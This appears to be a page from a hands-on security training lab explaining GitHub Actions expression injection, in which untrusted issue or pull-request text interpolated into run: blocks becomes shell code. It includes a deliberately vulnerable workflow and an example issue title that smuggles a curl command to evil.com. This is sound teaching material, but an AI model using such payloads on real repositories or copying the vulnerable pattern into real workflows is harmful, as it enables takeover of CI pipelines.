# Lab 2.6: GitHub Actions Injection

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Understand</span>
  <span class="phase-arrow">›</span>
  <a href="../break/" class="phase-step upcoming">Break</a>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Expression Interpolation

### Step 1: Examine the vulnerable workflow

```bash
cd /repos/wl-webapp
cat .gitea/workflows/issue-triage.yml
```

Look for `run:` blocks using `${{ }}` with event data:

```yaml
- name: Greet issue author
  run: |
    echo "Processing issue: ${{ github.event.issue.title }}"
    echo "Author: ${{ github.event.issue.user.login }}"
```

### Step 2: Understand expression evaluation order

1. **Expression evaluation**. `${{ github.event.issue.title }}` replaced with the literal string value
2. **Shell execution**. the resulting string passed to `bash -c`

If the issue title is `Fix" && curl http://evil.com #`, the shell sees:

```bash
echo "Processing issue: Fix" && curl http://evil.com #"
```

The `&&` breaks out of the echo. The `#` comments out the trailing quote.

### Step 3: Identify injectable contexts

Attacker-controlled (dangerous in `run:` blocks):

| Context | Controlled by |
|---------|--------------|
| `github.event.issue.title` | Issue author |
| `github.event.issue.body` | Issue author |
| `github.event.comment.body` | Comment author |
| `github.event.pull_request.title` | PR author |
| `github.event.pull_request.body` | PR author |
| `github.head_ref` | PR author (branch name) |
| `github.event.commits[*].message` | Committer |

Safe to interpolate:

| Context | Controlled by |
|---------|--------------|
| `github.repository` | Repo owner |
| `github.actor` | Authenticated user (limited charset) |
| `github.ref` | Git ref (limited by branch protection) |

### Step 4: How this differs from PPE

In PPE, the attacker modifies the workflow YAML. In expression injection, the **workflow file is never modified**. The injection comes through event data (issue titles, PR bodies, comments). Anyone who can open an issue can trigger it. CODEOWNERS does not help.
